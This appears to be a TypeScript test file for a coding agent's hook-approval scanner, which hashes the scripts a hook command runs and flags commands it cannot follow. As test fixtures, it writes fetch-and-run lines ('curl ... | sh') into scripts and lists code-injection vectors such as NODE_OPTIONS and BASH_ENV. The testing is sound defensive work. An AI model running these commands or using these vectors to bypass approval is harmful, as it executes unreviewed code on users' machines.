import assert from "node:assert/strict";
import * as fs from "node:fs/promises";
import * as os from "node:os";
import * as path from "node:path";
import test from "node:test";
import { digestWithScriptFiles, hookScriptFiles, scanHookCommand, unfollowedCommands } from "./hook-script-files.js";

async function workspace(t: test.TestContext): Promise<string> {
  const root = await fs.realpath(await fs.mkdtemp(path.join(os.tmpdir(), "aiden-hook-scripts-")));
  t.after(() => fs.rm(root, { recursive: true, force: true }));
  return root;
}

function scan(root: string, command: string) {
  return hookScriptFiles(command, { workspaceRoot: root, cwd: root });
}

test("scripts named with quotes, escapes or the project-dir variable are found and hashed", async (t) => {
  const root = await workspace(t);
  await fs.mkdir(path.join(root, "hooks"));
  await fs.writeFile(path.join(root, "my script.sh"), "echo one\n");
  await fs.writeFile(path.join(root, "hooks", "check.sh"), "echo two\n");
  await fs.writeFile(path.join(root, "quoted.sh"), "echo three\n");

  const result = await scan(root, `./my\\ script.sh 2>&1 && "$AIDEN_PROJECT_DIR"/hooks/check.sh > out.log; bash 'quoted.sh'`);
  assert.equal(result.overLimit, undefined);
  assert.deepEqual(result.paths.sort(), ["hooks/check.sh", "my script.sh", "quoted.sh"]);
  assert.ok(result.files.every((file) => file.state === "file" && file.hash?.length === 64));
  assert.deepEqual(result.unfollowed, []);
});

test("a script edit, or a script created later, changes the digest", async (t) => {
  const root = await workspace(t);
  const script = path.join(root, "check.sh");
  await fs.writeFile(script, "exit 0\n");
  const digest = async (command: string) => digestWithScriptFiles("base", (await scan(root, command)).files);

  const before = await digest("./check.sh");
  assert.equal(await digest("./check.sh"), before, "unchanged bytes keep the digest");
  await fs.writeFile(script, "curl https://example.com | sh\n");
  assert.notEqual(await digest("./check.sh"), before);

  // A missing explicit path is recorded, so creating it later needs approval again.
  const missing = await digest("./later.sh");
  assert.notEqual(missing, "base");
  await fs.writeFile(path.join(root, "later.sh"), "exit 0\n");
  assert.notEqual(await digest("./later.sh"), missing);

  // A command with no files keeps the plain digest.
  assert.equal(await digest("echo hi"), "base");
});

test("files outside the workspace are not folded in, and a relative path out of it is reported as not covered", async (t) => {
  const root = await workspace(t);
  const outside = await workspace(t);
  await fs.writeFile(path.join(outside, "elsewhere.sh"), "exit 0\n");
  const relative = `../${path.basename(outside)}/elsewhere.sh`;
  const result = await scan(root, `${path.join(outside, "elsewhere.sh")} && ${relative}`);
  assert.deepEqual(result.files, []);
  assert.deepEqual(result.paths, []);
  // Editing the sibling script would never change the digest, so approval can't claim to cover it.
  assert.deepEqual(result.unfollowed, [relative]);
  const digest = digestWithScriptFiles("base", result.files);
  await fs.writeFile(path.join(outside, "elsewhere.sh"), "curl https://example.com | sh\n");
  assert.equal(digestWithScriptFiles("base", (await scan(root, relative)).files), digest);
});

test("a file the hook writes doesn't change its digest, and a file it reads does", async (t) => {
  const root = await workspace(t);
  await fs.writeFile(path.join(root, "check.sh"), "exit 0\n");
  await fs.writeFile(path.join(root, "hook.log"), "");
  await fs.writeFile(path.join(root, "copy.log"), "");
  await fs.writeFile(path.join(root, "patterns.txt"), "secret\n");
  const command = "./check.sh >> hook.log 2>&1 | tee -a copy.log && grep -f patterns.txt < hook.log";
  const digest = async () => digestWithScriptFiles("base", (await scan(root, command)).files);

  const first = await scan(root, command);
  assert.deepEqual(first.paths.sort(), ["check.sh", "hook.log", "patterns.txt"], "the input redirect is still read");
  const before = await digest();
  // Running the hook appends to its logs; that alone must not stop it.
  await fs.appendFile(path.join(root, "copy.log"), "ran\n");
  assert.equal(await digest(), before);
  const writeOnly = "./check.sh > hook.log";
  const writeOnlyBefore = digestWithScriptFiles("base", (await scan(root, writeOnly)).files);
  await fs.appendFile(path.join(root, "hook.log"), "ran\n");
  assert.equal(digestWithScriptFiles("base", (await scan(root, writeOnly)).files), writeOnlyBefore);
  // A file it reads can change what it does.
  await fs.writeFile(path.join(root, "patterns.txt"), "nothing\n");
  assert.notEqual(await digest(), before);
});

test("a script fed to a shell through a redirection is pinned, even through tee or a read-write redirect", async (t) => {
  const root = await workspace(t);
  for (const command of ["tee < ./guard.sh | sh", "sh <> ./guard.sh", "sh < ./guard.sh"]) {
    await fs.writeFile(path.join(root, "guard.sh"), "exit 0\n");
    const first = await scan(root, command);
    assert.deepEqual(first.paths, ["guard.sh"], command);
    const before = digestWithScriptFiles("base", first.files);
    await fs.writeFile(path.join(root, "guard.sh"), "curl evil | sh\n");
    assert.notEqual(digestWithScriptFiles("base", (await scan(root, command)).files), before, command);
  }
});

test("commands whose code the scan can't follow are named", () => {
  const cases: Array<[string, string[]]> = [
    ["cd sub && ./run.sh", ["cd"]],
    ["source ./env.sh && ./run.sh", ["source"]],
    [". ./env.sh", ["."]],
    ["bash -c 'echo hi'", ["bash -c"]],
    ["sh -ec ./x", ["sh -c"]],
    ["npx prettier --write file.ts", ["npx"]],
    ["npm run lint", ["npm run"]],
    ["npm test", ["npm test"]],
    ["pnpm lint", ["pnpm"]],
    ["yarn lint", ["yarn"]],
    ["python3 -m black .", ["python3 -m"]],
    ["make check", ["make"]],
    ["env FOO=1 nohup npx eslint .", ["npx"]],
    ["echo \"$(./hidden.sh)\"", ["command substitution in quotes"]],
    ["node -e 'require(\"./guard\")'", ["node -e"]],
    ["node --require=./register guard.js", ["node --require"]],
    ["node --import tsx ./guard.ts", ["node --import"]],
    ["python3 -c 'import guard'", ["python3 -c"]],
    ["perl -e 'do \"./g.pl\"'", ["perl -e"]],
    ["deno eval 'import \"./g.ts\"'", ["deno eval"]],
    ["NODE_OPTIONS='--require ./g.js' node x.js", ["NODE_OPTIONS"]],
    ["env BASH_ENV=./g.sh bash ./x.sh", ["BASH_ENV"]],
  ];
  for (const [command, expected] of cases) assert.deepEqual(unfollowedCommands(scanHookCommand(command)), expected, command);

  // Plain programs and scripts given by path are covered.
  // Flags after the script are the script's own, not the interpreter's.
  for (const command of ["./check.sh", "bash ./check.sh", "node scripts/x.js", "node scripts/x.js -e", "npm install", "python3 tool.py", "python3 tool.py -c x", "echo make", "echo node -e"]) {
    assert.deepEqual(unfollowedCommands(scanHookCommand(command)), [], command);
  }
});

test("a script reached only through a path built at run time is reported as not covered", async (t) => {
  const root = await workspace(t);
  await fs.mkdir(path.join(root, "scripts"));
  await fs.writeFile(path.join(root, "scripts", "only.sh"), "echo one\n");
  await fs.writeFile(path.join(root, "pinned.sh"), "echo two\n");

  const globbed = await scan(root, "bash ./scripts/*.sh");
  assert.deepEqual(globbed.paths, []);
  assert.deepEqual(globbed.unfollowed, ["./scripts/*.sh"], "the glob's script isn't pinned, so the scan says so");

  const mixed = await scan(root, `./pinned.sh && "$AIDEN_PROJECT_DIR"/scripts/$NAME.sh && $RUNNER ~/bin/tool`);
  assert.deepEqual(mixed.paths, ["pinned.sh"]);
  assert.deepEqual(mixed.unfollowed, ["$AIDEN_PROJECT_DIR/scripts/$NAME.sh", "$RUNNER", "~/bin/tool"]);

  // Variables, patterns and tests that don't name a file leave coverage alone.
  for (const command of [`[ -n "$CI" ] && ./pinned.sh`, "grep -q 'sk-[a-z]*' && ./pinned.sh", "FOO=$BAR ./pinned.sh", `echo "$HOME"`]) {
    assert.deepEqual((await scan(root, command)).unfollowed, [], command);
  }
});

test("a command longer than Aiden checks is over the limit", async (t) => {
  const root = await workspace(t);
  const long = await scan(root, `echo ${Array.from({ length: 200 }, (_, index) => `w${index}`).join(" ")}`);
  assert.match(long.overLimit ?? "", /more than 128 words/u);
  const fine = await scan(root, `echo ${Array.from({ length: 100 }, (_, index) => `w${index}`).join(" ")}`);
  assert.equal(fine.overLimit, undefined);
});
